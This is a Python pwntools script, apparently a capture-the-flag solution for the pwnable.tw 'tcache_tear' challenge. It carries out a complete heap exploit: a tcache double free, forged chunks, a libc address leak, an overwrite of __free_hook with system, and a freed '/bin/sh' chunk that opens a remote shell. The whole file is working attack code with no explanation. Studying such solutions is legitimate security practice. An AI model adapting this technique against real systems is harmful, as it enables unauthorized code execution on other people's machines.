# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = 'tcache_tear'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = 'chall.pwnable.tw'
port = '10207'
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        if rlibc != '':
            libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(0)


def add(size, data):
    sla("choice :", "1")
    sla("Size:", str(size))
    sea("Data:", data)


def delete():
    sla("choice :", "2")


def show():
    sla("choice", "3")


sla("Name:", "Mask")
add(0xf8, 'a')
delete()
delete()
add(0x88, 'a')
add(0xf8, '\x10\x30')
add(0xf8, 'a')
add(
    0xf8,
    p64(0x0707070100000000) + p64(0x0707070707070707) + '\x00' * 5 * 16 +
    p64(0x602080) * 2 + p64(0x602060) * 2 + p64(0x602050) * 5)
add(
    0xd8,
    p64(0) + p64(0x91) + p64(0) * 5 + p64(0x602060) + p64(0) * 11 +
    p64(0x21) * 5)
# dbg("b*0x400C54")
delete()
show()
rc()
ru("Name :")
libc.address = un64(rn(6)) - 96 - 0x3ebc40
success(hex(libc.address))

add(0x88, p64(0) + p64(0x21) + p64(0) * 3 + p64(0x602070))

delete()
delete()

add(0x18, p64(libc.symbols['__free_hook']))
add(0x18, 'a')
add(0x18, p64(libc.symbols['system']))
add(0x58, '/bin/sh')
# dbg()
delete()
shell()
